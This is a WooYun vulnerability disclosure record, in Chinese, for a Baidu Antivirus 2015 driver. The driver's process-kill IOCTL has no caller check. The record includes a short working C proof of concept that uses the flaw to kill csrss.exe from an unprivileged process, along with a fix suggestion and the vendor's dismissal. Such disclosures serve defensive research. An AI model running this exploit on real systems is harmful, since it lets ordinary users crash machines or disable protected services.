{"id": 65366, "wybug_id": "wooyun-2015-0122823", "wybug_title": "Baidu Antivirus2015某驱动提权漏洞", "wybug_corp": "百度", "wybug_author": "路人甲", "wybug_date": "2015-06-26 10:03", "wybug_open_date": "2015-09-29 10:04", "wybug_type": "权限提升", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["驱动权限提升"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-01：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-29：\t细节向公众公开  简要描述： Baidu Antivirus2015的BdApiUtil驱动提供了内核杀进程的方法，但对使用者和被杀进程都没有任何权限限制，任意进程都可以使用该方法。在windows7以上的操作系统里，普通user进程通过该方法可以杀死system权限的进程，引发提权漏洞。 详细说明：  1.软件版本\n\n2.BdApiUtil.sys版本：5.4.3.161133.漏洞分析：BdApiUtil.sys驱动通过IoControlCode=0x800024B4的方式对外提供了内核模式杀进程的途径，但在IRP_MJ_DEVICE_CONTROL的处理逻辑中，没有对传递该控制码的调用者进行权限和身份验证，即使是user权限的进程也可以通过该漏洞杀死system权限的服务进程，包括系统关键服务在内。这就给恶意攻击者提供了提权手段，可以利用该漏洞杀死任意系统服务。   漏洞证明：  \nDWORD GetPidByName(LPCTSTR pName){\tif(!pName)\t\treturn 0;\tHANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\tif(INVALID_HANDLE_VALUE == hSnap)\t\treturn 0;\tDWORD dwPid = 0;\tPROCESSENTRY32 item = { 0 };\titem.dwSize = sizeof(PROCESSENTRY32);\tBOOL bNext = Process32First(hSnap, &item);\twhile (bNext)\t{\t\tif(StrStrI(item.szExeFile, pName))\t\t{\t\t\tdwPid = item.th32ProcessID;\t\t\tbreak;\t\t}\t\titem.dwSize = sizeof(PROCESSENTRY32);\t\tbNext = Process32Next(hSnap, &item);\t}\tCloseHandle(hSnap);\treturn dwPid;}void Fuzz2(HANDLE hDev){\tDWORD dwReturned = 0;\tchar input[4096] = { 0 };\tchar output[4096] = { 0 };\t*((DWORD*)input) = GetPidByName(_T(\"csrss.exe\"));\tDeviceIoControl(hDev,\t\t0x800024B4,\t\t(LPVOID)input,\t\t4,\t\tNULL,\t\t0,\t\t&dwReturned,\t\tNULL);}void Fuzz1(){\tLPCTSTR DevName = _T(\"\\\\\\\\.\\\\BdApiUtil\");\tHANDLE hDev = CreateFile(DevName,\t\tGENERIC_READ|GENERIC_WRITE,\t\tFILE_SHARE_READ|FILE_SHARE_WRITE,\t\tNULL,\t\tOPEN_EXISTING,\t\tFILE_ATTRIBUTE_NORMAL,\t\tNULL);\tif(INVALID_HANDLE_VALUE != hDev)\t{\t\tFuzz2(hDev);\t\tCloseHandle(hDev);\t}}int _tmain(int argc, _TCHAR* argv[]){\tFuzz1();\treturn 0;}\n   修复方案：  对DeviceIoControl传递0x800024B4的调用者做身份和权限检查，只有合法进程才允许使用该提权方法。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-29 10:04 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}